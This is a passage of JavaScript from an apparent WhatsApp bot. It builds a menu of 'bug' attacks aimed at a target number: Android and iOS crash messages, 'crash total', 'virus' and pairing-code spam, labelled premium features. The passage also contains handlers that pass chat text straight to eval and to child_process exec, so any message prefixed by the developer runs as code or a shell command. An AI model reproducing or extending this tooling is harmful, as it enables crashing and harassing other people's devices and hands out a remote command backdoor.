			let target = incTarget + '@s.whatsapp.net'
			global.jumlah = text.split("|")[1]

			let sections = [{
					title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝘽𝙇𝘼𝙉𝙆',
						id: `blank ${incTarget}`
					}]
				},
				{
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝙄𝙈𝙐𝙉𝙉𝙀 𝘼𝙏𝙏𝘼𝘾𝙆',
						id: `fuckyou ${incTarget}`
					}]
				},
				{
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝙕𝙉𝙓 𝘼𝙏𝙏𝘼𝘾𝙆',
						id: `vrl-attack ${incTarget}`
					}]
				},
				{
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝙃𝙊𝙈𝙀 𝘾𝙍𝘼𝙎𝙃',
						id: `katalog-crash ${incTarget}`
					}]
				},
				{
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝙎𝘼𝙈𝙎𝙐𝙉𝙂 𝘾𝙍𝘼𝙎𝙃',
						id: `crash-jid ${incTarget}`
					}]
				},
				{
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝙏𝙀𝘿𝙀𝙓 𝙑𝙄𝙍𝙐𝙎',
						id: `pentilatack ${incTarget}`
					}]
				},
				{
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝘾𝙍𝘼𝙎𝙃 𝙏𝙊𝙏𝘼𝙇',
						id: `attack-wa ${incTarget}`
					}]
				},
				{
					title: '⌜ 𝐈𝚯𝐒 ⌟',
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝘾𝙍𝘼𝙎𝙃 𝙄𝙊𝙎',
						description: `☇`,
						id: `iphone-crash ${incTarget}`
					}]
					},
						{
					title: '⌜ 𝐀𝐋𝐋 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐑𝐀𝐒𝐇 ??? ⌟',
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝘽𝙐𝙂 𝘼𝙈𝙋𝘼𝙎 😶‍🌫️',
						description: `𖠇`,
						id: `blank ${incTarget}`
					}]
					},
								{
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝙉𝙊 𝘾𝙍𝘼𝙎𝙃 𝙅𝙐𝙎𝙏 𝙋𝙍𝘼𝙉𝙆 😀',
						id: `attack-wa ${incTarget}`
					}]
				},
					{
					title: '⌜ 𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 ⌟',
					highlight_label: "𝙋𝙍𝙀𝙈𝙄𝙐𝙉 𝙊𝙉𝙇𝙔",
					rows: [{
						title: '𝙎𝙋𝘼𝙈 𝙋𝘼𝙄𝙍𝙄𝙉𝙂',
						description: `☘︎`,
						id: `spampair ${incTarget}l100`
					}]
				}
			]

			let listMessage = {
				title: `𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙀𝙇𝙇𝙀𝘾𝙏 𝙏𝙃𝙀 𝘽𝙐𝙂`,
				sections
			};

		let msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						"messageContextInfo": {
							"deviceListMetadata": {},
							"deviceListMetadataVersion": 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.create({
							contextInfo: {
								mentionedJid: [m.sender],
								isForwarded: true,
								forwardingScore: 999,
								forwardedNewsletterMessageInfo: {
									newsletterJid: global.xchannel.jid,
									newsletterName: '𝐕𝐑𝐋 ( 𝐕𝐀𝐑𝐄𝐋 )',
									serverMessageId: -1
								},
								businessMessageForwardInfo: {
									businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
								},
							},
							body: proto.Message.InteractiveMessage.Body.create({
								text: ''
							}),
							footer: proto.Message.InteractiveMessage.Footer.create({
								text: `⿻  ⌜  ᤪᤣ᪰𝐕͢𝐑ᤠ𝐋ᤡ 𝐕͢ᤡ𝟗  ⌟  ⿻`
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: `\n${global.namaowner}\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
								subtitle: `️`,
								hasMediaAttachment: true,
								...(await prepareWAMessageMedia({
									image: {
										url: "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
									}
								}, {
									upload: VxoZap.waUploadToServer
								}))
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
								buttons: [{
									"name": "single_select",
									"buttonParamsJson": JSON.stringify(listMessage)
								}, ]
							})
						})
					}
				}
			}, {})

			await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
				messageId: msg.key.id
			})
		}
		break
case 'apalages':
if (!isCreator) return replyy(global.nocreator)
if (!quoted) return replyy(`Reply to Video/Image With Caption ${prefix + command}`)
await loading()
let media = await quoted.download()
break

default:
if (budy.startsWith('=>')) {
if (!isDev) return replyy('*Only Vip*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return replyy(bang)}
try {
replyy(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replyy(String(e))}}
if (budy.startsWith('>')) {
if (!isDev) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await replyy(evaled)
} catch (err) {
await replyy(String(err))
}
}

if (budy.startsWith('$')) {
if (!isDev) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return replyy(`${err}`)
if (stdout) return replyy(stdout)
})
}

}
} catch (err) {
VxoZap.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})

